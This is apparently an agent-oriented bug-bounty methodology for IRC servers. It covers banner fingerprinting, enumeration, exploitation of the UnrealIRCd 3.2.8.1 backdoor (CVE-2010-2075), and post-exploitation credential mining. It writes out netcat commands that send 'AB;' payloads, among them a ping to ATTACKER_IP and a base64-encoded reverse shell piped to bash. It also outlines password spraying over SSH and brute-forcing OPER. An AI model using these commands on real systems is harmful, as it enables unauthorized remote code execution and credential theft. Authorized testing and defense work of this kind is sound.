---
technology: "IRC"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "field-grounded (the evidence pool's only IRC attack chain: irssi -c target --port 8067 -> 'Unreal 3.2.8.1' banner -> CVE-2010-2075 backdoor via msf unreal_ircd_3281_backdoor and manual 'AB;' netcat payloads -> shell as ircd user -> steg password in daemon-user homedir -> SSH reuse) + upstream-verified (NVD CVE-2010-2075; official UnrealIRCd advisory unrealsecadvisory.20100612.txt — md5 bad 752e46f2d873c1679fa99de3f52a274d / good 7b741e94e867c0a7370553fd01506c66, grep DEBUG3_DOLOG_SYSTEM include/struct.h check, Windows-binaries/CVS-unaffected scope; RFC 2812 registration/numerics). Area probe: no other ircd variant has field evidence -> no variant page (per gate). Thin unit, upstream-heavy by design. Companion overview: [[irc|IRC]]. Phase 4b additions (2026-11-13): rewritten from HackTricks (hacktricks/src/network-services-pentesting/pentesting-irc.md), CC BY-NC 4.0, accessed 2026-11-13 — nmap IRC NSE script names (irc-botnet-channels / irc-info / irc-unrealircd-backdoor) verified against the nmap repo; HT's ngIRCd 'wealllikedebian' sample-config password NOT carried: its cited source (sources.debian.org ngircd 0.10.0-1.1) is not archived there and the reference URL is dead."
---

# IRC bug bounty methodology

Target model: an ircd listener (conventional 6667/6697, custom ports common — always banner-grab
every unexplained TCP port), plaintext registration, no auth required to enumerate. Daemon family
decides the exploit lane; the enumeration core is identical everywhere. Authorization assumed;
everything in Phases 0-2 is passive/read-only.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Version/banner fingerprint | any ircd | yes | Routes to family CVE history — Info |
| Channel enumeration (LIST) | any ircd | yes | Channel names + topics: org/project recon — Info/Low |
| User/network enum (LUSERS, WHOIS, 433 loop) | any ircd | yes | Live users, hostmasks, idle times — Low |
| UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) | version string "Unreal 3.2.8.1" (mirror-served tarball builds only) | yes | RCE as ircd user — Critical |
| Daemon config/bot credential files | post-exploit on the ircd host | n/a (post) | S2S + oper + NickServ passwords -> reuse — High |
| Cleartext 6667 interception | on-path position | n/a (on-path) | Wholesale credential/session read — High |

## Phase 0 — Find and fingerprint

```bash
nmap -p 6667,6697,6666,8067 -sV 198.51.100.20
# ircd found on a custom port? banner-grab everything unexplained:
nc -n 198.51.100.20 8067        # many ircds print a banner/version line on connect
irssi -c 198.51.100.20 --port 8067   # full client; version shown in the status window
```

Observed chain: connecting with irssi printed the server version "Unreal 3.2.8.1" — that
string is the entire triage step; write it down before touching exploits. In irssi the connect
numerics and the version are visible immediately; CTCP `/quote VERSION` works too.

## Phase 1 — Registration oracle and enumeration

RFC 2812 registration is two lines, then the server answers questions for free:

```bash
printf 'NICK probe1\r\nUSER probe 0 * :probe\r\n' | nc -n 198.51.100.20 8067
# watch numerics: 001 welcome · 005 capabilities · 251 user counts · 433 nick in use
# then enumerate:
#   LIST          -> every non-secret channel + topic  (322 lines)
#   LUSERS        -> network user/service/server counts
#   WHOIS <nick>  -> hostmask, real name, idle, channels
#   ADMIN / MOTD  -> admin contact, message of the day (often internal info)
```

Playbook: `LIST` first (topics name projects and teams), `LUSERS` for scale, then a nick-collision
loop (`433` responses) over a name list to establish which identities are live right now. This is
Low on its own; it is the recon feed for phishing/credential findings.

## Phase 2 — UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) — verified upstream

Scope facts (official advisory + NVD): the trojan was in the mirror-served source tarball from
November 2009 through June 2010, in the DEBUG3_DOLOG_SYSTEM macro; commands prefixed `AB;`
execute as the ircd user, "regardless of any user restrictions (so even if you have passworded
server...)". Precompiled Windows binaries and CVS builds were NOT affected; 3.2.8 and earlier were
NOT affected. On-box verification: `grep DEBUG3_DOLOG_SYSTEM include/struct.h` outputs two lines
on a backdoored build; backdoored tarball md5 752e46f2d873c1679fa99de3f52a274d vs clean
7b741e94e867c0a7370553fd01506c66.

```bash
# harmless proof first — command output returns inline:
echo 'AB; ping -c2 ATTACKER_IP' | nc -n 198.51.100.20 65534
# shell (observed form, base64-wrapped reverse shell):
echo "AB; echo <base64-of-reverse-shell-one-liner> | base64 -d | bash" | nc -n 198.51.100.20 65534
```

Every listening ircd port answers the trigger — one observed deployment exposed IRC on 8067 and the backdoor
answered on 65534, so probe the port list, not just the IRC port. Metasploit ships this as
exploit/unix/irc/unreal_ircd_3281_backdoor. Non-3.2.8.1 banners: pivot to the daemon family's own
CVE history (InspIRCd, ngircd, Ergo) and to module/services bugs (Anope/Atheme) — no field
evidence for those lanes here, so verify versions against vendor advisories before claiming
exploitability.

## Phase 3 — Post-exploit on the ircd host

You land as the daemon user (`ircd`/`irc`). Priorities, in order:

1. **Daemon config**: ircd.conf / unrealircd.conf / links.conf / opers.conf — S2S link passwords
   (reused on other daemons in the network), oper blocks (hashed but crackable), listen blocks
   (more ports/services you missed).
2. **Bot and services configs** in the daemon/user home dirs — bot auth (NickServ) passwords,
   service API keys, webhooks; classic plaintext jackpot, all spray candidates on SSH/elsewhere.
3. **The daemon user's filesystem generally** — observed: the flag path ran through
   `/home/<otheruser>/Documents/.backup` holding a steg password that later unlocked an image
   password; daemon users often read more than they should.
4. **Credential reuse outward**: every password found -> SSH/user spray across the box and fleet
   (observed chain ended exactly there: cracked password -> SSH as the human user).

## Phase 4b — Raw-session protocol battery (upstream additions, 2026-11-13)

**Keepalive first**: after NICK/USER, a server that sends `PING :<token>` expects
`PONG :<token>` back or drops you — scripted raw sessions must answer it before any
enumeration output arrives. Networks may also gate registration behind a `PASS` line
(RFC 2812 allows it; SASL and reverse-DNS behavior are per-daemon configuration).

Once registered, the commands that round out Phase 1's set (availability is
daemon-dependent — treat errors as capability mapping, not failures):

```
VERSION            # daemon and version string (belt-and-braces beside the banner)
INFO / ADMIN       # server metadata, admin contact
LINKS              # server-to-server links visible to this server — network map
HELPOP USERCMDS / HELPOP OPERCMDS   # ircd-specific: lists user/operator commands
OPERATOR CAPA      # capability listing where supported
USERS / TIME       # connection counts; server clock (TS mismatch = finding feed)
STATS a            # link statistics — operator-gated: an error here maps the privilege line
NAMES <channel>    # membership per channel without joining
USERHOST <nick> / USERIP <nick>     # hostmask / IP disclosure where enabled
```

`OPER <username> <password>` is the operator-credential oracle: it is the one command
that takes a credential pair pre-session, so a small targeted wordlist against it (with
authorization) tests the oper blocks Phase 3 later mines — expect lockup-free but logged
responses. USERHOST/USERIP replies leak client IPs on daemons that honor them — that is
a finding in its own right when the network promises cloaking.

**TLS ports**: `openssl s_client -connect <host>:6697 -quiet` gives the same raw-session
work over TLS (cert details free with it). **nmap's IRC trio** for discovery sweeps:
irc-info (banner/version and settings), irc-botnet-channels (channel reconnaissance),
irc-unrealircd-backdoor (the Phase 2 check, scripted). **Shodan**: the greeting fragment
`looking up your hostname` fingerprints ircd banners.

## Reporting notes

- Enumeration (Phases 0-1): Info/Low with the recovered channel/user inventory as impact.
- CVE-2010-2075: Critical pre-auth RCE — include the version evidence, the `AB;` proof output,
  and note the distribution-scope caveat (only mirror-served 3.2.8.1 tarballs between Nov 2009
  and Jun 2010 were trojanized — version alone doesn't prove the target's build lineage).
- Credential reuse: report per-destination finding; the IRC-side file is the source.
- Remediation framing: retire or upgrade legacy ircds; move to TLS ports; never run daemons from
  trojan-era tarballs; secrets out of bot configs.

## Appendix — Tool map

- **nmap** (`-sV`, full port range for custom ircd ports) — Phase 0.
- **nc / netcat** — banner grab, raw registration, `AB;` payload delivery — Phases 0-2.
- **irssi** (or weechat/hexchat) — client-grade registration and version read — Phases 0-1.
- **Metasploit** (exploit/unix/irc/unreal_ircd_3281_backdoor) — Phase 2 alternative.
- **hashcat / John** — oper-block and reused-credential cracking — Phase 3.
- Tools vault companions by name: nmap, netcat, irssi, metasploit, hashcat.

CVE index: CVE-2010-2075 (UnrealIRCd 3.2.8.1 mirror tarball trojan, DEBUG3_DOLOG_SYSTEM macro,
`AB;` command execution as ircd user — pre-auth, unlimited by user restrictions). Other daemon
families: verify per-target against vendor advisories; no field evidence, no claims here.
